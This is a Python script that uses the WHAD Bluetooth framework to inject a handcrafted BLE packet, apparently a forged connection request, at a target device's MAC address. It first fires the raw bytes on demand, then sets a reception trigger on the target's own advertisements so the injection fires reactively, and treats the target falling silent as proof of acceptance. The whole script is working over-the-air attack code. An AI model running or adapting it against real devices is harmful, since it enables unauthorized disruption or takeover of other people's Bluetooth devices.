#!/usr/bin/env python3
import argparse, time, statistics, sys

def _parse_args():
    p = argparse.ArgumentParser(description="Root-cause WHAD prepare(): ManualTrigger vs ReceptionTrigger literal injection.")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

RAW = bytes.fromhex("8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D")
TARGET = ARGS.mac
ADVA = bytes.fromhex(TARGET.replace(":", ""))[::-1]
T0 = time.time()
def log(m): print(f"[{time.time()-T0:6.2f}s] {m}", flush=True)

from whad.device import WhadDevice
from whad.ble.connector import Injector
from whad.common.triggers import ManualTrigger, ReceptionTrigger
from scapy.layers.bluetooth4LE import BTLE, BTLE_DATA

# THE TRICK: wrap our literal 36 bytes in a BTLE_DATA layer so prepare() accepts
PKT = BTLE(bytes.fromhex("D6BE898E")) / BTLE_DATA(RAW)
rt = bytes(PKT[BTLE_DATA:])
log("round-trip: " + ("BYTE-EXACT" if rt == RAW else f"MISMATCH {rt.hex().upper()}"))
if rt != RAW: sys.exit(1)

dev = WhadDevice.create(ARGS.port); inj = Injector(dev)
try: inj.enable_scan_mode()
except Exception as e: log(f"scan-mode: {type(e).__name__}: {e}")
try: inj.start()
except Exception: pass

cnt = {"n":0, "t":[]}
_orig = inj.on_adv_pdu
def _adv(p,*a,**k):
    try:
        if ADVA in bytes(p): cnt["n"]+=1; cnt["t"].append(time.time())
    except Exception: pass
    try: return _orig(p,*a,**k)
    except Exception: pass
inj.on_adv_pdu = _adv

log("waiting for target ...")
t0=time.time()
while time.time()-t0<15 and cnt["n"]==0: time.sleep(0.1)
if cnt["n"]==0: log("not advertising - retry"); sys.exit(2)
log(f"target present ({cnt['n']} ADVs)")

# TEST 1: ManualTrigger -> immediate TX of literal bytes (plumbing test)
mt = ManualTrigger()
ok = inj.prepare(PKT, trigger=mt)
log(f"TEST1 prepare(Manual) -> {ok}")
if ok:
    log(f"TEST1 trigger() -> {inj.trigger(mt)}  (literal bytes TX'd NOW)")
    for _ in range(3):
        time.sleep(0.7)
        m2 = ManualTrigger()
        if inj.prepare(PKT, trigger=m2): inj.trigger(m2)
    log("TEST1: fired 4x - a sniffer would capture your exact bytes")

# TEST 2: ReceptionTrigger(AdvA) -> reactive literal injection? (the big question)
log("TEST2 arming ReceptionTrigger(AdvA@off0), watching 25s for acceptance-silence")
tg = ReceptionTrigger(pattern=ADVA, mask=b"\xff"*6, offset=0)
ok = inj.prepare(PKT, trigger=tg)
log(f"TEST2 prepare(Reception) -> {ok}")
if not ok: log("firmware refuses even wrapped PDUs -> firmware patch is the path"); sys.exit(3)
gap=None; accepted=False; t0=time.time(); lp=0
while time.time()-t0<25:
    now=time.time(); t=cnt["t"]
    if len(t)>=4:
        ivs=[b-a for a,b in zip(t,t[1:]) if 0.05<b-a<3]
        thr=max(3.0,3*(statistics.median(ivs) if ivs else 1.0))
        if gap is None and now-t[-1]>thr:
            gap=t[-1]; log(f">>> SILENCE >{thr:.1f}s - possible ACCEPTANCE")
        if gap and t and t[-1]>gap+1.0:
            log(f"<<< RESUMED after {t[-1]-gap:.2f}s - ACCEPTED, honored ~2s timeout! >>>")
            accepted=True; break
    if now-lp>=5: lp=now; log(f"   ... ADVs:{cnt['n']}")
    time.sleep(0.05)
log("="*58)
log("VERDICT: REACTIVE LITERAL INJECTION WORKS" if accepted else
    "VERDICT: reactive literal TX not available on stock firmware")
log("="*58)
